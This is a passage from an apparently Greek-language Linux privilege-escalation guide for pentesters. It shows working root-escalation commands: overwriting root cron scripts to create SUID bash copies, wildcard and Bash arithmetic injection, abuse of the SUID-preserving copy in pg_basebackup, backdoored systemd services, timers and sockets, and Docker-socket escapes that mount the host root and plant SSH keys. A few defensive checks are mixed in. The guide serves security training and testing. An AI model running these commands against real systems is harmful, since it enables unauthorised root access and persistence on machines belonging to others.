echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron μέσω script με wildcard (Wildcard Injection)

Αν ένα script που εκτελείται από τον root έχει ένα “**\***” μέσα σε μια εντολή, θα μπορούσατε να το εκμεταλλευτείτε για να προκαλέσετε απρόσμενα πράγματα (όπως privesc). Παράδειγμα:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Αν πριν από το wildcard υπάρχει διαδρομή όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ούτε το** _**./\***_ **).**

Διαβάστε την παρακάτω σελίδα για περισσότερα tricks εκμετάλλευσης wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injection μέσω αριθμητικής επέκτασης Bash σε parsers αρχείων καταγραφής cron

Η αριθμητική του Bash μπορεί να ερμηνεύσει μη έμπιστο κείμενο ως έκφραση. Σε ορισμένα περιβάλλοντα Bash, ένας δείκτης πίνακα μέσα σε αυτή την έκφραση μπορεί να αξιολογήσει μια αντικατάσταση εντολής. Αν ένας προνομιούχος cron/parser τοποθετήσει κείμενο αρχείου καταγραφής που ελέγχεται από εισβολέα σε μια τέτοια αριθμητική σύγκριση, η αντικατάσταση μπορεί να εκτελεστεί με την ταυτότητα του parser.<sup>[[22]](#references)</sup> Αυτό εξαρτάται από την ακριβή έκφραση και έκδοση του Bash· μια γυμνή συμβολοσειρά `$(...)0` σε μια επεκτεινόμενη μεταβλητή δεν αποτελεί από μόνη της αξιόπιστη απόδειξη επαναξιολόγησης.

Η είσοδος μπορεί επίσης να προέρχεται από μεταδεδομένα αρχείων ή από άλλο πεδίο που διαβάζεται από μια θέση εγγράψιμη από χρήστη. Για παράδειγμα, ένα προνομιούχο script εκκαθάρισης που διαβάζει την ετικέτα `Producer` μιας εικόνας και τη συγκρίνει με `[[ "$producer" -eq "expected" ]]` εκτελεί αριθμητική σύγκριση, παρότι η μεταβλητή βρίσκεται σε εισαγωγικά. Εντοπίστε την ταυτότητα εκτέλεσης της προγραμματισμένης εργασίας, ποια αρχεία μπορούν να παρέχουν την ετικέτα, τυχόν μετασχηματισμούς πριν από τη σύγκριση και την ακριβή συμπεριφορά του Bash. Για ετικέτες κειμένου, χρησιμοποιήστε σύγκριση συμβολοσειρών· για αριθμούς, επικυρώστε ότι η είσοδος αποτελείται από δεκαδικά ψηφία πριν από την αριθμητική πράξη. Δείτε τους [κανόνες αριθμητικής του Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Τυπικό ευάλωτο μοτίβο:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Ασφαλής τοπική διερεύνηση συμπεριφοράς για τον μηχανισμό array-subscript (χωρίς διεργασία με αυξημένα προνόμια ή αλλαγή αρχείου):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Εντοπίστε το πραγματικό προγραμματισμένο script και το κυριολεκτικό path εισόδου που ανοίγει. Ακόμα κι όταν το ίδιο το αρχείο log δεν είναι εγγράψιμο, ένας χρήστης που μπορεί να γράψει και να διασχίσει τον μη sticky γονικό του κατάλογο ενδέχεται να μπορεί να αντικαταστήσει την καταχώρισή του. Η `namei -l` βοηθά να διακρίνετε αυτά τα δικαιώματα. Ένα διαφορετικό εγγράψιμο path για log, ένας scheduler που δεν είναι αναγνώσιμος ή ένας parser που δεν αξιολογεί ποτέ αυτό το πεδίο ως αριθμητική έκφραση Bash δεν τεκμηριώνει αυτή τη δυνατότητα.

### Αντικατάσταση cron script και symlink

Αν **μπορείτε να τροποποιήσετε ένα cron script** που εκτελείται από τον root, μπορείτε να αποκτήσετε shell πολύ εύκολα:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Αν το script που εκτελείται από τον root χρησιμοποιεί έναν **κατάλογο στον οποίο έχεις πλήρη πρόσβαση**, ίσως θα ήταν χρήσιμο να διαγράψεις αυτόν τον φάκελο και να δημιουργήσεις έναν φάκελο symlink προς έναν άλλο, ο οποίος περιέχει ένα script υπό τον έλεγχό σου.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Επικύρωση symlink και ασφαλέστερος χειρισμός αρχείων

Κατά την εξέταση προνομιούχων scripts/binaries που διαβάζουν ή γράφουν αρχεία μέσω διαδρομής, ελέγξτε πώς γίνεται ο χειρισμός των συνδέσμων:

- Το `stat()` ακολουθεί ένα symlink και επιστρέφει τα μεταδεδομένα του στόχου.
- Το `lstat()` επιστρέφει τα μεταδεδομένα του ίδιου του συνδέσμου.
- Τα `readlink -f` και `namei -l` βοηθούν στην επίλυση του τελικού στόχου και εμφανίζουν τα δικαιώματα κάθε στοιχείου της διαδρομής.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Για τους defenders/developers, ασφαλέστερες πρακτικές για την αντιμετώπιση τεχνασμάτων με symlink είναι:

- `O_EXCL` με `O_CREAT`: αποτυγχάνει αν η διαδρομή υπάρχει ήδη (εμποδίζει συνδέσμους/αρχεία που έχει δημιουργήσει εκ των προτέρων ο attacker).
- `openat()`: λειτουργεί σε σχέση με έναν έμπιστο file descriptor καταλόγου.
- `mkstemp()`: δημιουργεί προσωρινά αρχεία ατομικά, με ασφαλή δικαιώματα.

### Cron binaries με προσαρμοσμένη υπογραφή και writable payloads
Ένας απλός χρήστης που μπορεί να γράψει στο συγκεκριμένο binary που εκτελείται από ένα root cron job ενδέχεται να διασχίσει ένα όριο προνομίων, αλλά ένας έλεγχος προσαρμοσμένης υπογραφής μπορεί να απορρίψει μια unsigned αντικατάσταση. Στην τεκμηριωμένη περίπτωση, το ELF ανήκε στον root και είχε mode `0760`, επιτρέποντας σε μέλος της ομάδας του να το τροποποιήσει, ενώ ο root owner μπορούσε να το εκτελέσει. Ένα ορατό process trace έδειξε ότι εκτελούνταν `objcopy` για την εξαγωγή του `.text_sig` πριν το job εκτελέσει το binary· το πλήρες script επαλήθευσης δεν ήταν αναγνώσιμο.<sup>[[2]](#references)</sup>

Η αντικατάσταση που πέτυχε υπογράφηκε με leaked ιδιωτικό υλικό υπογραφής, χρησιμοποιώντας έναν ELF signer. Η [τεκμηρίωση της μορφής](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) περιγράφει ένα τμήμα υπογραφής που προκύπτει από το `.text` του εκτελέσιμου. Δεν αποδεικνύεται ότι η απλή προσθήκη ενός πιστοποιητικού ή μιας συμβολοσειράς που ταιριάζει στο `.text_sig` ικανοποιεί τον μη ορατό verifier. Ελέγξτε την πραγματική προγραμματισμένη διαδρομή, την αποτελεσματική πρόσβαση εγγραφής, την εκτέλεση από τον root και την πολιτική του verifier πριν συμπεράνετε ότι ένα writable signed binary είναι exploitable. Ένα τμήμα `.text_sig` από μόνο του αποτελεί απλώς ένδειξη προς εξέταση.

### Συχνά cron jobs

Μπορείτε να παρακολουθείτε τις διεργασίες για να εντοπίσετε όσες εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσετε να το εκμεταλλευτείτε για να κλιμακώσετε τα προνόμιά σας.

Για παράδειγμα, για **παρακολούθηση κάθε 0.1s επί 1 λεπτό**, **ταξινόμηση με βάση τις εντολές που εκτελέστηκαν λιγότερες φορές** και διαγραφή των εντολών που εκτελέστηκαν τις περισσότερες φορές, μπορείτε να κάνετε:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (θα παρακολουθεί και θα καταγράφει κάθε διεργασία που ξεκινά).

### Αντίγραφα ασφαλείας root που διατηρούν τα mode bits που όρισε ο επιτιθέμενος (pg_basebackup)

Αν ένα cron που εκτελείται ως root χρησιμοποιεί το `pg_basebackup` (ή οποιαδήποτε αναδρομική αντιγραφή) σε έναν κατάλογο βάσης δεδομένων στον οποίο έχετε δικαίωμα εγγραφής, μπορείτε να τοποθετήσετε ένα **δυαδικό αρχείο SUID/SGID** που θα αντιγραφεί ξανά ως **root:root**, με τα ίδια mode bits, στον προορισμό του αντιγράφου ασφαλείας.<sup>[[26]](#references)</sup>

Τυπική διαδικασία εντοπισμού (ως χρήστης DB με χαμηλά δικαιώματα):
- Χρησιμοποιήστε το `pspy` για να εντοπίσετε ένα cron του root που εκτελεί κάθε λεπτό κάτι όπως `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Επιβεβαιώστε ότι ο πηγαίος cluster (π.χ., `/var/lib/postgresql/14/main`) είναι εγγράψιμος από εσάς και ότι ο προορισμός (`/opt/backups/current`) αποκτά ιδιοκτήτη root μετά την εκτέλεση της εργασίας.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Αυτό λειτουργεί επειδή το `pg_basebackup` διατηρεί τα bits δικαιωμάτων αρχείων κατά την αντιγραφή του cluster· όταν εκτελείται από τον root, τα αρχεία προορισμού αποκτούν **ιδιοκτησία root + SUID/SGID που έχει επιλέξει ο attacker**. Κάθε παρόμοια προνομιούχα ρουτίνα backup/αντιγραφής που διατηρεί τα δικαιώματα και γράφει σε μια τοποθεσία όπου μπορούν να εκτελεστούν αρχεία είναι ευάλωτη.

### Αόρατα cron jobs

Είναι δυνατό να δημιουργηθεί ένα cronjob **τοποθετώντας έναν χαρακτήρα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα αλλαγής γραμμής), και το cron job θα λειτουργήσει. Παράδειγμα (προσέξτε τον χαρακτήρα carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Για να εντοπίσετε αυτού του είδους την κρυφή καταχώριση, εξετάστε τα αρχεία cron με εργαλεία που εμφανίζουν τους χαρακτήρες ελέγχου:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Υπηρεσίες

### Εγγράψιμα αρχεία _.service_

Ελέγξτε αν μπορείτε να γράψετε σε κάποιο αρχείο `.service`. Αν μπορείτε, **θα μπορούσατε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία **εκκινηθεί**, **επανεκκινηθεί** ή **σταματήσει** (ίσως χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση του μηχανήματος).\
Για παράδειγμα, δημιουργήστε το backdoor σας μέσα στο αρχείο .service με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα εκτελέσιμα αρχεία υπηρεσιών

Έχετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής σε εκτελέσιμα αρχεία που εκτελούνται από υπηρεσίες**, μπορείτε να τα αντικαταστήσετε με backdoor, ώστε να εκτελούνται όταν εκτελεστούν ξανά οι υπηρεσίες.

### systemd PATH - Σχετικές διαδρομές

Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:

```bash
systemctl show-environment
```

Αν διαπιστώσετε ότι μπορείτε να **γράψετε** σε οποιονδήποτε φάκελο της διαδρομής, ίσως μπορέσετε να **escalate privileges**. Πρέπει να αναζητήσετε **relative paths** που χρησιμοποιούνται σε αρχεία διαμόρφωσης υπηρεσιών, όπως:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Στη συνέχεια, δημιουργήστε ένα **εκτελέσιμο** με **το ίδιο όνομα με το binary της σχετικής διαδρομής** μέσα στον φάκελο PATH του systemd στον οποίο έχετε δικαίωμα εγγραφής. Όταν ζητηθεί από την υπηρεσία να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), θα εκτελεστεί το **backdoor** σας (οι μη προνομιούχοι χρήστες συνήθως δεν μπορούν να ξεκινήσουν ή να σταματήσουν υπηρεσίες, αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε το `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με το `man systemd.service`.**

## **Timers**

Τα **Timers** είναι αρχεία μονάδων systemd με όνομα που τελειώνει σε `**.timer**` και ελέγχουν αρχεία `**.service**` ή συμβάντα. Τα **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική λύση στο cron, καθώς διαθέτουν ενσωματωμένη υποστήριξη για συμβάντα ημερολογιακής και μονότονης χρονικής στιγμής και μπορούν να εκτελούνται ασύγχρονα.

Μπορείτε να απαριθμήσετε όλα τα timers με:

```bash
systemctl list-timers --all
```

### Εγγράψιμοι χρονοδιακόπτες

Αν μπορείτε να τροποποιήσετε έναν χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελέσει κάποια υπάρχουσα μονάδα του systemd.unit (όπως ένα `.service` ή ένα `.target`).

```bash
Unit=backdoor.service
```

Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η μονάδα:

> Η μονάδα που θα ενεργοποιηθεί όταν παρέλθει αυτός ο χρονοδιακόπτης. Το όρισμα είναι ένα όνομα μονάδας, του οποίου η κατάληξη δεν είναι ".timer". Αν δεν καθοριστεί, η προεπιλεγμένη τιμή είναι μια υπηρεσία με το ίδιο όνομα με τη μονάδα χρονοδιακόπτη, χωρίς την κατάληξη. (Βλ. παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της μονάδας χρονοδιακόπτη να είναι ίδια, εκτός από την κατάληξη.

Επομένως, για να καταχραστείτε αυτό το δικαίωμα θα πρέπει να:

- Βρείτε κάποια μονάδα systemd (όπως ένα `.service`) που **εκτελεί ένα δυαδικό αρχείο στο οποίο έχετε δικαίωμα εγγραφής**
- Βρείτε κάποια μονάδα systemd που **εκτελεί μια σχετική διαδρομή** και να έχετε **δικαιώματα εγγραφής στο systemd PATH** (ώστε να υποδυθείτε αυτό το εκτελέσιμο αρχείο)

**Μάθετε περισσότερα για τους χρονοδιακόπτες με `man systemd.timer`.**

### **Ενεργοποίηση χρονοδιακόπτη**

Για να ενεργοποιήσετε έναν χρονοδιακόπτη χρειάζεστε δικαιώματα root και πρέπει να εκτελέσετε:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Σημειώστε ότι το **timer** **ενεργοποιείται** δημιουργώντας έναν συμβολικό σύνδεσμο προς αυτό στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Τα Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία μεταξύ διεργασιών** στο ίδιο ή σε διαφορετικά μηχανήματα, στο πλαίσιο μοντέλων client-server. Χρησιμοποιούν τυπικά αρχεία περιγραφέων Unix για επικοινωνία μεταξύ υπολογιστών και ρυθμίζονται μέσω αρχείων `.socket`.<sup>[[14]](#references)</sup>

Τα sockets μπορούν να ρυθμιστούν μέσω αρχείων `.socket`.

**Μάθετε περισσότερα για τα sockets με την εντολή `man systemd.socket`.** Μέσα σε αυτό το αρχείο μπορούν να ρυθμιστούν αρκετές ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν μεταξύ τους, αλλά συνοπτικά **υποδεικνύουν πού θα ακούει** το socket (τη διαδρομή του αρχείου socket AF_UNIX, τη διεύθυνση IPv4/6 ή/και τον αριθμό θύρας όπου θα ακούει κ.λπ.)
- `Accept`: Δέχεται όρισμα boolean. Αν είναι **true**, **δημιουργείται ένα instance της υπηρεσίας για κάθε εισερχόμενη σύνδεση** και σε αυτό περνά μόνο το socket της σύνδεσης. Αν είναι **false**, όλα τα ίδια τα sockets που ακούν **περνούν στη μονάδα υπηρεσίας που εκκινείται** και δημιουργείται μόνο μία μονάδα υπηρεσίας για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για sockets datagram και FIFOs, όπου μία μονάδα υπηρεσίας χειρίζεται υποχρεωτικά όλη την εισερχόμενη κίνηση. **Η προεπιλεγμένη τιμή είναι false**. Για λόγους απόδοσης, συνιστάται η δημιουργία νέων daemons μόνο με τρόπο συμβατό με `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Δέχονται μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τη δημιουργία και τη σύνδεση των **sockets**/FIFOs που ακούν, αντίστοιχα. Το πρώτο token της γραμμής εντολών πρέπει να είναι απόλυτο όνομα αρχείου και να ακολουθούν τα ορίσματα της διεργασίας.
- `ExecStopPre`, `ExecStopPost`: Πρόσθετες **εντολές** που **εκτελούνται πριν** ή **μετά** το κλείσιμο και την αφαίρεση των **sockets**/FIFOs που ακούν, αντίστοιχα.
- `Service`: Καθορίζει το όνομα της μονάδας **υπηρεσίας που θα ενεργοποιηθεί** κατά την **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Ως προεπιλογή, χρησιμοποιείται η υπηρεσία που έχει το ίδιο όνομα με το socket (με αντικατάσταση της κατάληξης). Στις περισσότερες περιπτώσεις, δεν θα πρέπει να χρειάζεται να χρησιμοποιήσετε αυτήν την επιλογή.

### Εγγράψιμα αρχεία .socket

Αν βρείτε ένα **εγγράψιμο** αρχείο `.socket`, μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι όπως: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση του μηχανήματος.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί τη διαμόρφωση αυτού του αρχείου socket, αλλιώς το backdoor δεν θα εκτελεστεί_

### Ενεργοποίηση socket + εγγράψιμη διαδρομή μονάδας (δημιουργία υπηρεσίας που λείπει)

Μια άλλη σοβαρή λανθασμένη διαμόρφωση είναι η εξής:

- μια μονάδα socket με `Accept=no` και `Service=<name>.service`
- η μονάδα υπηρεσίας που αναφέρεται δεν υπάρχει
- ένας attacker μπορεί να γράψει στο `/etc/systemd/system` (ή σε άλλη διαδρομή αναζήτησης μονάδων)

Σε αυτήν την περίπτωση, ο attacker μπορεί να δημιουργήσει το `<name>.service` και έπειτα να προκαλέσει κίνηση προς το socket, ώστε το systemd να φορτώσει και να εκτελέσει τη νέα υπηρεσία ως root.

Γρήγορη ροή:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Εγγράψιμα sockets

Αν **εντοπίσετε οποιοδήποτε εγγράψιμο socket** (_εδώ μιλάμε για Unix Sockets και όχι για τα αρχεία ρυθμίσεων `.socket`_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε κάποια ευπάθεια.

### Απαρίθμηση Unix Sockets

```bash
netstat -a -p --unix
```

### Ακατέργαστη σύνδεση

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Παράδειγμα εκμετάλλευσης:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν κάποια **sockets που ακούν αιτήματα HTTP** (_δεν μιλάω για αρχεία .socket, αλλά για αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Αν το socket **απαντά με ένα HTTP** request, τότε μπορείς να **επικοινωνήσεις** μαζί του και ίσως να **εκμεταλλευτείς κάποια ευπάθεια**.

### Εγγράψιμο Docker Socket

Το Docker socket, που συνήθως βρίσκεται στη διαδρομή `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να προστατεύεται. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η δυνατότητα εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε κλιμάκωση προνομίων. Ακολουθεί μια ανάλυση του τρόπου με τον οποίο μπορεί να γίνει αυτό, καθώς και εναλλακτικών μεθόδων αν δεν είναι διαθέσιμο το Docker CLI.

#### **Κλιμάκωση προνομίων με Docker CLI**

Αν έχεις δυνατότητα εγγραφής στο Docker socket, μπορείς να κλιμακώσεις τα προνόμιά σου με τις ακόλουθες εντολές:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Αυτές οι εντολές σάς επιτρέπουν να εκτελέσετε ένα container με πρόσβαση root στο σύστημα αρχείων του host.

#### **Χρήση του Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, μπορείτε και πάλι να κάνετε κατάχρηση του Docker socket χρησιμοποιώντας ακατέργαστο HTTP μέσω του Unix socket. Η πιο αξιόπιστη διαδικασία είναι:

- δημιουργήστε ένα βοηθητικό container μεγάλης διάρκειας ζωής, με το root του host προσαρτημένο μέσω bind mount
- εκκινήστε το
- δημιουργήστε ένα `exec` instance μέσα σε αυτό το βοηθητικό container
- εκκινήστε το `exec` instance και διαβάστε την έξοδο μέσω του API

**Λίστα εικόνων Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Δημιουργήστε και εκκινήστε ένα βοηθητικό container**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Δημιουργήστε ένα exec instance**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Εκκινήστε το exec instance και διαβάστε την έξοδο**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Αυτό το μοτίβο είναι συνήθως πιο αξιόπιστο από το να προσπαθείτε να χειριστείτε χειροκίνητα το `attach` με `socat` ή `nc -U`. Μόλις μπορέσετε να δημιουργήσετε ένα helper με `/:/host`, μπορείτε να χρησιμοποιήσετε επιπλέον instances του `exec` για να διαβάσετε αρχεία όπως το `/host/root/...`, να προσθέσετε SSH keys στο `/host/root/.ssh` ή να τροποποιήσετε αρχεία εκκίνησης του host.

### Άλλα

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο socket του docker επειδή **ανήκετε στην ομάδα `docker`**, υπάρχουν [**περισσότεροι τρόποι για κλιμάκωση προνομίων**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Αν το [**docker API ακούει σε μια θύρα**, μπορείτε επίσης να το παραβιάσετε](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Δείτε **περισσότερους τρόπους διαφυγής από containers ή κατάχρησης των container runtimes για κλιμάκωση προνομίων** εδώ:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Κλιμάκωση προνομίων με το Containerd (ctr)

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να την καταχραστείτε για κλιμάκωση προνομίων**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Κλιμάκωση προνομίων με το **RunC**

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`**, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να την καταχραστείτε για κλιμάκωση προνομίων**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο **σύστημα επικοινωνίας μεταξύ διεργασιών (IPC)** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να ανταλλάσσουν δεδομένα αποτελεσματικά. Σχεδιασμένο με γνώμονα τα σύγχρονα συστήματα Linux, προσφέρει ένα ισχυρό πλαίσιο για διαφορετικές μορφές επικοινωνίας μεταξύ εφαρμογών.<sup>[[16]](#references)</sup>

Το σύστημα είναι ευέλικτο και υποστηρίζει βασικό IPC που διευκολύνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, θυμίζοντας **βελτιωμένα UNIX domain sockets**. Επιπλέον, βοηθά στη μετάδοση συμβάντων ή σημάτων, διευκολύνοντας την απρόσκοπτη ενσωμάτωση των στοιχείων του συστήματος. Για παράδειγμα, ένα σήμα από έναν daemon Bluetooth για εισερχόμενη κλήση μπορεί να κάνει ένα πρόγραμμα αναπαραγωγής μουσικής να σιγήσει, βελτιώνοντας την εμπειρία του χρήστη. Επιπρόσθετα, το D-Bus υποστηρίζει ένα σύστημα απομακρυσμένων αντικειμένων, απλοποιώντας τα αιτήματα υπηρεσιών και τις κλήσεις μεθόδων μεταξύ εφαρμογών, και απλοποιώντας διαδικασίες που παραδοσιακά ήταν περίπλοκες.

Το D-Bus λειτουργεί με ένα **μοντέλο allow/deny**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κ.λπ.) με βάση τη σωρευτική επίδραση των κανόνων πολιτικής που αντιστοιχούν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus και ενδέχεται να επιτρέψουν κλιμάκωση προνομίων μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρακάτω δίνεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, η οποία περιγράφει τα δικαιώματα του root user να κατέχει το `fi.w1.wpa_supplicant1`, να του στέλνει μηνύματα και να λαμβάνει μηνύματα από αυτό.

Οι πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα ισχύουν καθολικά, ενώ οι πολιτικές του "default" context ισχύουν για όλα όσα δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Μάθετε πώς να κάνετε enumeration και exploit σε μια επικοινωνία D-Bus εδώ:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να κάνετε enumeration στο δίκτυο και να προσδιορίσετε τη θέση του μηχανήματος.

### Γενικό enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
